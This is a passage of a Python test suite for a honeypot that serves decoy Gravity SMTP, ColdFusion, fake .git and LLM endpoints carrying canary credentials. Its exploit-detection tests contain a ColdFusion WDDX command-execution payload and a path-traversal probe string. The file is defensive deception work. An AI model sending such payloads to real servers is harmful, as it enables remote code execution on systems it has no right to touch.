    every per-hit-synthetic field — this is the lock on the design
    principle that no credential-shaped value is a fixed literal."""
    a = json.loads(tbenv.render_gravity_smtp_config(FAKE_TRACEBIT, "victim.example"))
    b = json.loads(tbenv.render_gravity_smtp_config(FAKE_TRACEBIT, "victim.example"))
    assert a["mailgun"]["api_key"] != b["mailgun"]["api_key"]
    assert a["sendgrid"]["api_key"] != b["sendgrid"]["api_key"]
    assert a["sparkpost"]["api_key"] != b["sparkpost"]["api_key"]
    assert a["smtp"]["password"] != b["smtp"]["password"]
    assert a["gmail"]["access_token"] != b["gmail"]["access_token"]
    assert a["gmail"]["refresh_token"] != b["gmail"]["refresh_token"]
    assert a["office365"]["client_secret"] != b["office365"]["client_secret"]


def test_gravity_smtp_settings_has_no_credential_fields():
    """Settings is a fingerprint surface, not a credential surface — make
    sure no `password` / `secret_key` / `api_key` field leaks into it
    by accident on a future expansion."""
    body = tbenv.render_gravity_smtp_settings("victim.example").decode("utf-8")
    payload = json.loads(body)
    forbidden = {"password", "secret_key", "api_key", "aws_secret_access_key"}
    for key in payload:
        assert key not in forbidden, f"credential field {key!r} leaked into /settings"
    # Sanity: host-derived from_email is per-sensor (no fleet-wide fixed literal).
    assert payload["from_email"] == "wordpress@victim.example"


def test_gravity_smtp_connector_unknown_takes_miss_branch():
    """Unknown connector names must not be served a credential-shaped
    response (the dispatch falls through to `gravitysmtp-miss`)."""
    # The renderer itself is only called for known connectors — confirm
    # the dispatcher-side gate by asserting the known set excludes things
    # scanners could probe.
    for unknown in ("postmark", "mailjet", "fakemailer", "../etc"):
        assert unknown not in tbenv._GRAVITY_SMTP_KNOWN_CONNECTORS


async def test_dispatch_gravity_smtp_config_embeds_canary(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/config",
        headers={"X-Forwarded-For": "203.0.113.110"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type", "").startswith("application/json")
    payload = json.loads(await resp.text())
    assert payload["amazonses"]["aws_access_key_id"] == "AKIAFAKEEXAMPLE01"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-config"
    assert entry["gravitysmtpMethod"] == "GET"
    assert "aws" in entry["canaryTypes"]


async def test_dispatch_gravity_smtp_settings_returns_settings(flux_client):
    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/settings",
        headers={"X-Forwarded-For": "203.0.113.111", "Host": "victim.example"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload["default_connector"] == "amazonses"
    assert "amazonses" in payload["connectors_enabled"]

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-settings"


async def test_dispatch_gravity_smtp_mock_data_with_query_string(flux_client):
    """Real scanners hit `?page=gravitysmtp-settings`; the query string
    must not change dispatch."""
    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/tests/mock-data?page=gravitysmtp-settings",
        headers={"X-Forwarded-For": "203.0.113.112"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-mock-data"


async def test_dispatch_gravity_smtp_connector_gmail(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "API_KEY", "fake-key")
    monkeypatch.setattr(tbenv, "_get_or_issue_canary", _fake_canary)

    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/connector/gmail",
        headers={"X-Forwarded-For": "203.0.113.113"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload["connector"] == "gmail"
    # Gmail OAuth shape — per-hit synthetic, not a canary.
    assert payload["access_token"].startswith("ya29.")
    assert payload["refresh_token"].startswith("1//")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-connector-gmail"
    assert entry["gravitysmtpConnector"] == "gmail"
    # No AWS canary on gmail (only the SES connector triggers issuance).
    assert "aws" not in entry["canaryTypes"]


async def test_dispatch_gravity_smtp_connector_unknown_404s(flux_client):
    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/connector/postmark",
        headers={"X-Forwarded-For": "203.0.113.114"},
    )
    assert resp.status == 404
    payload = json.loads(await resp.text())
    assert payload["code"] == "rest_no_route"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-miss"


async def test_dispatch_gravity_smtp_keyless_serves_config_with_empty_canary(flux_client, monkeypatch):
    """A keyless deployment (no `TRACEBIT_API_KEY`) must still serve the
    `/config` response so banner-grab scanners walk the namespace — the
    AWS slots just go empty."""
    monkeypatch.setattr(tbenv, "API_KEY", "")

    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/config",
        headers={"X-Forwarded-For": "203.0.113.115"},
    )
    assert resp.status == 200
    payload = json.loads(await resp.text())
    assert payload["amazonses"]["aws_access_key_id"] == ""
    assert payload["amazonses"]["aws_secret_access_key"] == ""

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "gravitysmtp-config"
    # No canary issuance happens on keyless deployments.
    assert entry["canaryTypes"] == []


async def test_dispatch_gravity_smtp_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "GRAVITY_SMTP_ENABLED", False)
    resp = await flux_client.get(
        "/wp-json/gravitysmtp/v1/config",
        headers={"X-Forwarded-For": "203.0.113.116"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- ColdFusion trap ---


def test_coldfusion_enabled_by_default():
    assert tbenv.COLDFUSION_ENABLED


def test_coldfusion_default_paths_cover_observed_family():
    for path in (
        "/indice.cfm",
        "/menu.cfm",
        "/base.cfm",
        "/CFIDE/componentutils/",
        "/CFIDE/administrator/index.cfm",
        "/CFIDE/adminapi/administrator.cfc",
    ):
        assert tbenv.is_coldfusion_path(path), f"expected match: {path}"


def test_coldfusion_path_non_match():
    for path in ["/", "/index.cfm", "/administrator/", "/cfide", "/geoserver/web/"]:
        assert not tbenv.is_coldfusion_path(path), f"unexpected match: {path}"


def test_coldfusion_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "COLDFUSION_ENABLED", False)
    assert not tbenv.is_coldfusion_path("/CFIDE/componentutils/")


def test_coldfusion_has_exploit_detects_adminapi_and_runtime():
    assert tbenv._coldfusion_has_exploit(
        "/CFIDE/adminapi/administrator.cfc", "method=login", ""
    )
    assert tbenv._coldfusion_has_exploit(
        "/CFIDE/componentutils/",
        "",
        '<wddxPacket><string>Runtime.getRuntime().exec("id")</string></wddxPacket>',
    )
    assert not tbenv._coldfusion_has_exploit("/menu.cfm", "", "normal")


def test_render_coldfusion_public_page_links_followups():
    body = tbenv.render_coldfusion_public_page(
        "/menu.cfm", "victim.example", "2021.0.05",
    ).decode("utf-8")
    assert "Adobe ColdFusion 2021.0.05" in body
    assert "/CFIDE/componentutils/" in body
    assert "/CFIDE/administrator/index.cfm" in body


def test_render_coldfusion_adminapi_escapes_method_name():
    body = tbenv.render_coldfusion_adminapi("<x>", "2021.0.05").decode("utf-8")
    assert "&lt;x&gt;" in body
    assert "<x>" not in body


async def test_dispatch_coldfusion_public_cfm(flux_client):
    resp = await flux_client.get(
        "/menu.cfm",
        headers={"X-Forwarded-For": "203.0.113.71", "Host": "cf.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "ColdFusion application server" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-public-cfm"
    assert entry["coldfusionPath"] == "/menu.cfm"
    assert entry["coldfusionHasExploit"] is False


async def test_dispatch_coldfusion_componentutils_logs_exploit_body(flux_client):
    body = b'<wddxPacket><string>Runtime.getRuntime().exec("id")</string></wddxPacket>'
    resp = await flux_client.post(
        "/CFIDE/componentutils/",
        data=body,
        headers={
            "X-Forwarded-For": "203.0.113.72",
            "Content-Type": "text/xml",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "ColdFusion Component Browser" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-componentutils"
    assert entry["coldfusionHasExploit"] is True
    assert "coldfusionPayloadPreview" in entry
    assert "Runtime.getRuntime" in entry["bodyPreview"]


async def test_dispatch_coldfusion_admin_post_captures_auth_and_body(flux_client):
    resp = await flux_client.post(
        "/CFIDE/administrator/enter.cfm",
        data="cfadminPassword=guess",
        headers={
            "X-Forwarded-For": "203.0.113.73",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "CFID=1; CFTOKEN=abc",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Data Sources" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-admin-post"
    assert entry["coldfusionHasAuth"] is True
    assert entry["coldfusionHasExploit"] is True
    assert "cfadminPassword" in entry["bodyPreview"]


async def test_dispatch_coldfusion_adminapi_logs_method(flux_client):
    resp = await flux_client.get(
        "/CFIDE/adminapi/administrator.cfc?method=login",
        headers={"X-Forwarded-For": "203.0.113.74"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<wddxPacket" in text
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "coldfusion-adminapi"
    assert entry["coldfusionAction"] == "login"
    assert entry["coldfusionHasExploit"] is True


async def test_dispatch_coldfusion_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "COLDFUSION_ENABLED", False)
    resp = await flux_client.get(
        "/CFIDE/componentutils/", headers={"X-Forwarded-For": "203.0.113.75"}
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"



# --- _env_bool: explicit env var parsing ---


def test_env_bool_reads_truthy_string(monkeypatch):
    """Explicit env values are honored; defaults are overridden."""
    monkeypatch.setenv("FLUX_TEST_BOOL", "YES")
    assert tbenv._env_bool("FLUX_TEST_BOOL", default=False) is True
    monkeypatch.setenv("FLUX_TEST_BOOL", "nope")
    assert tbenv._env_bool("FLUX_TEST_BOOL", default=True) is False
    monkeypatch.delenv("FLUX_TEST_BOOL", raising=False)
    assert tbenv._env_bool("FLUX_TEST_BOOL", default=True) is True


# --- Pure LLM renderers ---


def test_render_ollama_chat_shape():
    import json
    payload = json.loads(tbenv.render_ollama_chat("llama3.1:8b"))
    assert payload["model"] == "llama3.1:8b"
    assert payload["done"] is True
    assert payload["message"]["role"] == "assistant"
    assert payload["message"]["content"]


def test_render_ollama_chat_defaults_model():
    import json
    payload = json.loads(tbenv.render_ollama_chat(""))
    assert payload["model"]  # non-empty default


def test_render_ollama_generate_shape():
    import json
    payload = json.loads(tbenv.render_ollama_generate("mistral:7b"))
    assert payload["model"] == "mistral:7b"
    assert payload["done"] is True
    assert payload["response"]


def test_render_openai_completion_shape():
    import json
    payload = json.loads(tbenv.render_openai_completion("gpt-4o"))
    assert payload["object"] == "text_completion"
    assert payload["model"] == "gpt-4o"
    assert payload["choices"][0]["text"]
    assert payload["choices"][0]["finish_reason"] == "stop"


def test_render_openai_embedding_shape():
    import json
    payload = json.loads(tbenv.render_openai_embedding(""))
    assert payload["object"] == "list"
    assert payload["model"]  # default populated
    assert isinstance(payload["data"][0]["embedding"], list)
    assert all(isinstance(v, (int, float)) for v in payload["data"][0]["embedding"])


def test_render_ollama_ps_shape():
    import json
    payload = json.loads(tbenv.render_ollama_ps())
    assert payload == {"models": []}


# --- extract_llm_prompt: edge shapes ---


def test_extract_llm_prompt_embedding_list_input():
    model, prompt, action, stream = tbenv.extract_llm_prompt(
        b'{"model":"text-embedding-3-small","input":["hello","world"]}',
        "application/json",
    )
    assert model == "text-embedding-3-small"
    assert action == "embedding"
    assert "hello" in prompt and "world" in prompt
    assert stream is False


def test_extract_llm_prompt_embedding_scalar_input():
    _, prompt, action, _ = tbenv.extract_llm_prompt(
        b'{"model":"text-embedding-3-small","input":42}',
        "application/json",
    )
    assert action == "embedding"
    assert prompt == "42"


def test_extract_llm_prompt_messages_skips_non_dict_entries():
    _, prompt, action, _ = tbenv.extract_llm_prompt(
        b'{"model":"gpt-4o","messages":[null,{"role":"user","content":"hi"}]}',
        "application/json",
    )
    assert action == "chat"
    assert "hi" in prompt


def test_extract_llm_prompt_messages_coerces_non_string_content():
    _, prompt, action, _ = tbenv.extract_llm_prompt(
        b'{"model":"gpt-4o","messages":[{"role":"user","content":7}]}',
        "application/json",
    )
    assert action == "chat"
    assert "7" in prompt


# --- simulate_command_output: remaining branches ---


def test_simulate_command_output_hostname():
    assert tbenv.simulate_command_output("hostname") == "web-01\n"


def test_simulate_command_output_pwd():
    assert tbenv.simulate_command_output("pwd").startswith("/var/www/html")


def test_simulate_command_output_ls():
    assert "wp_filemanager.php" in tbenv.simulate_command_output("ls")


def test_simulate_command_output_w_who():
    assert tbenv.simulate_command_output("who") == "\n"


# --- parse_cookies: malformed parts ---


def test_parse_cookies_skips_malformed_parts():
    result = tbenv.parse_cookies("; good=1; bad; another=2")
    assert result == {"good": "1", "another": "2"}


# --- _parse_chain_params ---


def test_parse_chain_params_extracts_both():
    assert tbenv._parse_chain_params("_hp_chain=abc&_hp_hop=3") == ("abc", 3)


def test_parse_chain_params_empty():
    assert tbenv._parse_chain_params("") == ("", 0)


def test_parse_chain_params_non_integer_hop_silently_zero():
    # Malformed hop must not raise — scanners send junk.
    assert tbenv._parse_chain_params("_hp_chain=abc&_hp_hop=xyz") == ("abc", 0)


def test_parse_chain_params_ignores_unrelated_and_keyless_parts():
    assert tbenv._parse_chain_params("foo=bar&keyless&_hp_chain=cid") == ("cid", 0)


# --- Tarpit modules (pure classes) ---


class _Ctx:
    """Minimal stand-in for a tarpit ctx dict in augment-only tests."""


def _log_ctx():
    return {"clientIp": "203.0.113.5", "path": "/", "host": "", "query": ""}


def test_cookie_tracking_augment_sets_cookie_and_records_returned_tid():
    mod = tbenv.CookieTrackingModule()

    class FakeReq:
        headers = {"Cookie": "_hp_tid=prev-id; foo=bar"}

    headers, meta = mod.augment(FakeReq(), {"log_context": _log_ctx(), "path": "/"})
    assert "_hp_tid=" in headers["Set-Cookie"]
    assert "HttpOnly" in headers["Set-Cookie"]
    assert meta["cookieReturned"] == "prev-id"
    assert meta["cookieId"]  # fresh per-request id


def test_cookie_tracking_augment_first_visit_has_no_returned_tid():
    mod = tbenv.CookieTrackingModule()

    class FakeReq:
        headers = {"Cookie": ""}

    _, meta = mod.augment(FakeReq(), {})
    assert "cookieReturned" not in meta
    assert meta["cookieId"]


def test_etag_probe_augment_no_conditional_headers():
    mod = tbenv.ETagProbeModule()

    class FakeReq:
        headers = {}

    headers, meta = mod.augment(FakeReq(), {"request_id": "req-abc"})
    assert headers["ETag"] == '"req-abc"'
    assert headers["Last-Modified"]
    assert meta["etag"] == '"req-abc"'
    assert "conditionalRequest" not in meta


def test_etag_probe_augment_records_if_none_match_and_if_modified_since():
    mod = tbenv.ETagProbeModule()

    class FakeReq:
        headers = {
            "If-None-Match": '"prev"',
            "If-Modified-Since": "Mon, 01 Jan 2024 00:00:00 GMT",
        }

    _, meta = mod.augment(FakeReq(), {"request_id": "x"})
    assert meta["conditionalRequest"] is True
    assert meta["ifNoneMatch"] == '"prev"'
    assert meta["ifModifiedSince"].startswith("Mon,")


def test_content_length_mismatch_augment_returns_claimed_bytes(monkeypatch):
    monkeypatch.setattr(tbenv, "MOD_CONTENT_LENGTH_CLAIMED_BYTES", 1_000_000_000)
    mod = tbenv.ContentLengthMismatchModule()
    headers, meta = mod.augment(None, {})
    assert headers["Content-Length"] == "1000000000"
    assert meta["claimedBytes"] == 1_000_000_000


def test_redirect_chain_should_run_false_when_chain_already_set(monkeypatch):
    monkeypatch.setattr(tbenv, "MOD_REDIRECT_CHAIN_ENABLED", True)
    mod = tbenv.RedirectChainModule()
    assert not mod.should_run({"query": "_hp_chain=existing"})
    # And true for the initial request (no chain param yet).
    assert mod.should_run({"query": "other=1"})
    assert mod.should_run({"query": ""})


def test_dns_callback_should_run_requires_domain(monkeypatch):
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_ENABLED", True)
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_DOMAIN", "")
    assert not tbenv.DNSCallbackModule().should_run({})
    monkeypatch.setattr(tbenv, "MOD_DNS_CALLBACK_DOMAIN", "track.example")
    assert tbenv.DNSCallbackModule().should_run({})


def test_tarpit_module_base_defaults():
    """Base class is a no-op. Subclasses opt in by overriding."""
    base = tbenv.TarpitModule()
    assert base.should_run({}) is False
    headers, meta = base.augment(None, {})
    assert headers == {} and meta == {}


# --- build_tarpit_chunk ---


def test_build_tarpit_chunk_pads_to_chunk_bytes_plus_newline(monkeypatch):
    monkeypatch.setattr(tbenv, "TARPIT_CHUNK_BYTES", 64)
    chunk = tbenv.build_tarpit_chunk("abcdef1234567890-req", "/short", 1)
    assert len(chunk) == 65  # TARPIT_CHUNK_BYTES + trailing newline
    assert chunk.endswith(b"\n")
    assert b"TRACEBIT_TARPIT_" in chunk
    assert b"/short" in chunk


def test_build_tarpit_chunk_truncates_long_payload(monkeypatch):
    monkeypatch.setattr(tbenv, "TARPIT_CHUNK_BYTES", 8)
    long_path = "/" + ("verylongpath" * 20)
    chunk = tbenv.build_tarpit_chunk("req", long_path, 7)
    assert len(chunk) == 9  # 8 + newline
    assert chunk.endswith(b"\n")


# --- format_env_payload ---


def test_format_env_payload_includes_aws_ssh_and_http_blocks():
    response = {
        "aws": {
            "awsAccessKeyId": "AKIAEXAMPLE",
            "awsSecretAccessKey": "supersecret",
            "awsSessionToken": "token123",
            "awsExpiration": "2030-01-01T00:00:00Z",
        },
        "ssh": {
            "sshIp": "198.51.100.5",
            "sshPrivateKey": "PRIV",
            "sshPublicKey": "PUB",
            "sshExpiration": "2030-01-01T00:00:00Z",
        },
        "http": {
            "gitlab-cookie": {
                "credentials": {"name": "_gitlab_session", "value": "v"},
                "hostNames": ["gitlab.example"],
                "expiresAt": "2030-01-01T00:00:00Z",
            },
        },
    }
    payload = tbenv.format_env_payload(response)
    assert "AWS_ACCESS_KEY_ID=AKIAEXAMPLE" in payload
    assert "SSH_HOST=198.51.100.5" in payload
    assert "SSH_PRIVATE_KEY_B64=PRIV" in payload
    # http blocks upper-case + underscore the canary type
    assert "GITLAB_COOKIE_HOSTNAMES=gitlab.example" in payload
    assert "GITLAB_COOKIE_EXPIRATION=2030-01-01T00:00:00Z" in payload
    # credentials are JSON-encoded inline
    assert '"_gitlab_session"' in payload


def test_format_env_payload_empty_response_returns_empty_body():
    # An upstream that returns nothing usable must render as an empty body,
    # not a self-labelling error sentinel. An empty .env is unremarkable;
    # "TRACEBIT_CANARY_ERROR=..." would burn the trap.
    assert tbenv.format_env_payload({}) == ""


def test_format_env_payload_ignores_non_dict_entries():
    # Defensive: upstream must not crash flux. Also must not leak a tell.
    payload = tbenv.format_env_payload({"aws": "not a dict", "http": "also not", "ssh": None})
    assert payload == ""


def test_format_env_payload_no_honeypot_tell_in_output():
    # The rendered payload is served to the attacker on /.env; any literal
    # mention of "honeypot", "autogenerated", "canary", "tracebit", or
    # "issued_at" anywhere in the body burns the trap. Covers every populated
    # branch so credential-key names are guarded alongside headers.
    response = {
        "aws": {
            "awsAccessKeyId": "AKIAEXAMPLE",
            "awsSecretAccessKey": "supersecret",
            "awsSessionToken": "token123",
            "awsExpiration": "2030-01-01T00:00:00Z",
        },
        "ssh": {
            "sshIp": "198.51.100.5",
            "sshPrivateKey": "PRIV",
            "sshPublicKey": "PUB",
            "sshExpiration": "2030-01-01T00:00:00Z",
        },
        "http": {
            "gitlab-cookie": {
                "credentials": {"name": "_gitlab_session", "value": "v"},
                "hostNames": ["gitlab.example"],
                "expiresAt": "2030-01-01T00:00:00Z",
            },
        },
    }
    payload = tbenv.format_env_payload(response).lower()
    for tell in ("honeypot", "autogenerated", "canary", "tracebit", "issued_at"):
        assert tell not in payload, f"payload leaks '{tell}'"
    # Empty response must also not leak.
    assert tbenv.format_env_payload({}) == ""


# --- Fake git primitives ---


def test_git_loose_object_is_valid_for_blob():
    import zlib
    content = b"hello, git\n"
    sha, blob_bytes = tbenv._git_loose_object(b"blob", content)
    raw = zlib.decompress(blob_bytes)
    # Git loose-object header: "blob <len>\x00" + content
    header, _, body = raw.partition(b"\x00")
    assert header == b"blob 11"
    assert body == content
    # Canonical git sha = sha1(header\x00 + content)
    import hashlib
    assert sha == hashlib.sha1(raw).hexdigest()


def test_git_tree_entry_packs_mode_name_and_binary_sha():
    entry = tbenv._git_tree_entry("100644", "README.md", "1" * 40)
    assert entry.startswith(b"100644 README.md\x00")
    assert entry[-20:] == bytes.fromhex("1" * 40)


def test_format_secrets_yaml_embeds_aws_canary():
    body = tbenv._format_secrets_yaml({"aws": {
        "awsAccessKeyId": "AKIAFAKEYAML01",
        "awsSecretAccessKey": "yamlSecret",
        "awsSessionToken": "yamlTok",
        "awsExpiration": "2030-01-01T00:00:00Z",
    }})
    assert "access_key_id: AKIAFAKEYAML01" in body
    assert "session_token: yamlTok" in body
    assert body.startswith("# config/secrets.yml")


def test_format_secrets_yaml_tolerates_missing_aws():
    # Not expected in practice, but the function must not crash.
    body = tbenv._format_secrets_yaml({})
    assert "access_key_id:" in body  # placeholder line still present


def test_build_fake_repo_produces_expected_layout_and_sha_linkage():
    import zlib
    secrets_body = tbenv._format_secrets_yaml({"aws": {
        "awsAccessKeyId": "AKIATESTREPO",
        "awsSecretAccessKey": "x", "awsSessionToken": "y", "awsExpiration": "z",
    }})
    files, meta = tbenv._build_fake_repo(secrets_body)

    # The minimum surface a git-dumper walks. Keys are lowercased so
    # lookups via extract_git_path() (which returns a lowercase key) match
    # regardless of the case a scanner uses on the wire.
    for required in ("/.git/head", "/.git/config", "/.git/refs/heads/main",
                     "/.git/packed-refs", "/.git/info/refs", "/.git/logs/head"):
        assert required in files, required

    # refs/heads/main + packed-refs both reference the commit SHA.
    assert meta["commitSha"] in files["/.git/refs/heads/main"].decode()
    assert meta["commitSha"] in files["/.git/packed-refs"].decode()

    # The secrets blob object exists at its hashed path and decompresses
    # to a body that still carries the canary.
    secrets_path = f"/.git/objects/{meta['secretsBlobSha'][:2]}/{meta['secretsBlobSha'][2:]}"
    assert secrets_path in files
    raw = zlib.decompress(files[secrets_path])
    assert raw.startswith(b"blob ")
    assert b"AKIATESTREPO" in raw

    # Commit object references the root tree sha.
    commit_path = f"/.git/objects/{meta['commitSha'][:2]}/{meta['commitSha'][2:]}"
    commit_raw = zlib.decompress(files[commit_path])
    assert commit_raw.startswith(b"commit ")
    assert f"tree {meta['rootTreeSha']}".encode() in commit_raw


# --- /.git/config URL embeds Tracebit canary (git-config-canary) ---


def test_fake_git_config_url_embeds_canary_credential(monkeypatch):
    # With no operator override, the URL userinfo is the Tracebit AWS key
    # pair — so a scraper that only reads /.git/config still walks away
    # with a live canary.
    monkeypatch.setattr(tbenv, "FAKE_GIT_REMOTE_URL", "")
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    config = files["/.git/config"].decode()
    assert "url = https://AKIAFAKEEXAMPLE01:" in config
    # '/' '+' '=' in the secret are percent-encoded so downstream URL
    # parsers don't choke.
    assert "wJalrXUtnFEMI%2FK7MDENG%2FbPxRfiCYEXAMPLEKEY" in config
    assert "@github.com/internal/tools.git" in config


def test_fake_git_config_url_respects_operator_override(monkeypatch):
    # If the operator pins FAKE_GIT_REMOTE_URL, it's used verbatim.
    monkeypatch.setattr(tbenv, "FAKE_GIT_REMOTE_URL", "git@corp.example:myrepo.git")
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    config = files["/.git/config"].decode()
    assert "url = git@corp.example:myrepo.git" in config
    # No canary leaked in the URL when an override is set.
    assert "AKIAFAKEEXAMPLE01" not in config


def test_fake_git_config_url_falls_back_when_canary_missing(monkeypatch):
    # If Tracebit returns a response without AWS creds, we must not emit
    # a malformed URL — fall back to a static SSH URL.
    monkeypatch.setattr(tbenv, "FAKE_GIT_REMOTE_URL", "")
    secrets_body = tbenv._format_secrets_yaml({})
    files, _meta = tbenv._build_fake_repo(secrets_body, {})
    config = files["/.git/config"].decode()
    assert "url = git@github.com:internal/tools.git" in config


# --- extract_git_path: prefix + case-insensitive coverage ---


@pytest.mark.parametrize("path,expected", [
    # Direct /.git/ access
    ("/.git/config", "/.git/config"),
    ("/.git/HEAD", "/.git/head"),
    ("/.git/refs/heads/main", "/.git/refs/heads/main"),
    # Root pointers
    ("/.git", "/.git/"),
    ("/.git/", "/.git/"),
    # Case variants
    ("/.GIT/CONFIG", "/.git/config"),
    ("/.Git/Config", "/.git/config"),
    ("/.gIt/cOnFiG", "/.git/config"),
    # Prefixed-app variants (app deployed at subpath)
    ("/login/.git/config", "/.git/config"),
    ("/project/.git/HEAD", "/.git/head"),
    ("/api/.git/index", "/.git/index"),
    ("/backend/.git/refs/heads/main", "/.git/refs/heads/main"),
    # Nested prefix
    ("/a/b/c/.git/config", "/.git/config"),
    # Case-variant inside a prefix
    ("/Login/.GiT/CoNfIg", "/.git/config"),
])
def test_extract_git_path_recognises_git_requests(path, expected):
    assert tbenv.extract_git_path(path) == expected


@pytest.mark.parametrize("path", [
    "/",
    "/.env",
    "/.gitignore",
    "/.gitconfig",
    "/.git-credentials",
    "/gitconfig",
    "/foo/bar",
    "",
    # `.git` as part of a filename segment, not a directory
    "/.gitlab-ci.yml",
    # Decoy — must require actual `/.git/` substring
    "/gitrepo/config",
])
def test_extract_git_path_ignores_non_git_requests(path):
    assert tbenv.extract_git_path(path) is None


# --- /.git/index placeholder ---


def test_fake_git_index_is_valid_dirc_header():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    index = files["/.git/index"]
    # Signature + version 2 + entry count 0 + 20 zero bytes (trailer slot).
    assert index.startswith(b"DIRC")
    assert index[4:8] == b"\x00\x00\x00\x02"
    assert index[8:12] == b"\x00\x00\x00\x00"
    assert len(index) == 32


def test_fake_git_credentials_leaf_embeds_gitlab_canary():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    body = files["/.git/credentials"].decode("utf-8")
    assert body.startswith("https://deploybot42:")
    assert "p%40ssCanaryValue" in body
    assert "@gitlab.canary.example" in body


# --- /.git plumbing files a real repo always ships (COMMIT_EDITMSG, ---
# --- ORIG_HEAD, FETCH_HEAD, alternate refs, remote-tracking refs) ---


def test_fake_git_repo_ships_commit_editmsg_orig_head_fetch_head():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    # COMMIT_EDITMSG holds the last commit message (newline-terminated).
    assert files["/.git/commit_editmsg"].decode("utf-8") == (
        tbenv.FAKE_GIT_COMMIT_MESSAGE + "\n"
    )
    # ORIG_HEAD points at the same commit as the live ref.
    assert files["/.git/orig_head"].decode("utf-8") == meta["commitSha"] + "\n"
    # FETCH_HEAD records the commit + remote-branch annotation. The double-tab
    # is the canonical empty middle column git emits for the ref we asked for.
    fetch_head = files["/.git/fetch_head"].decode("utf-8")
    assert fetch_head.startswith(meta["commitSha"] + "\t\tbranch 'main' of ")
    assert fetch_head.endswith("\n")


def test_fake_git_repo_serves_master_alias_and_remote_tracking_refs():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    sha = meta["commitSha"]
    # `master` co-located as an alias of `main` — both branch names get
    # enumerated by scanners, so both must resolve.
    assert files["/.git/refs/heads/master"].decode("utf-8") == sha + "\n"
    # Remote-tracking refs: HEAD is symbolic, leaf refs hold the commit.
    assert files["/.git/refs/remotes/origin/head"] == b"ref: refs/remotes/origin/main\n"
    assert files["/.git/refs/remotes/origin/main"].decode("utf-8") == sha + "\n"
    assert files["/.git/refs/remotes/origin/master"].decode("utf-8") == sha + "\n"
    # Matching reflogs so a scanner that walks logs/refs/* sees consistent
    # state with the refs themselves.
    for key in (
        "/.git/logs/refs/heads/master",
        "/.git/logs/refs/remotes/origin/head",
        "/.git/logs/refs/remotes/origin/main",
        "/.git/logs/refs/remotes/origin/master",
    ):
        body = files[key].decode("utf-8")
        assert sha in body, key


def test_fake_git_repo_ships_canonical_sample_hooks():
    secrets_body = tbenv._format_secrets_yaml(FAKE_TRACEBIT)
    files, _meta = tbenv._build_fake_repo(secrets_body, FAKE_TRACEBIT)
    # Every name in the hook set lands at a `.sample` path with a
    # non-trivial shell-shaped body. Returning 404 on any one of these is a
    # cheap fingerprint for "this is a hand-rolled fake repo".
    # Canonical git template ships 14 (`applypatch-msg` … `update`); we
    # additionally ship the `post-*` hooks scanner enumeration dictionaries
    # walk (`post-commit`, `post-receive`, `post-checkout`, `post-merge`,
    # `post-rewrite`) — those are common at orgs that wire CI through them,
    # so a real exposed repo plausibly carries them.
    canonical_template_hooks = {
        "applypatch-msg", "commit-msg", "fsmonitor-watchman", "post-update",
        "pre-applypatch", "pre-commit", "pre-merge-commit", "pre-push",
        "pre-rebase", "pre-receive", "prepare-commit-msg",
        "push-to-checkout", "sendemail-validate", "update",
    }
    assert canonical_template_hooks <= set(tbenv._FAKE_GIT_HOOK_NAMES)
    extra_hooks = {
        "post-commit", "post-receive", "post-checkout", "post-merge",
        "post-rewrite",
    }
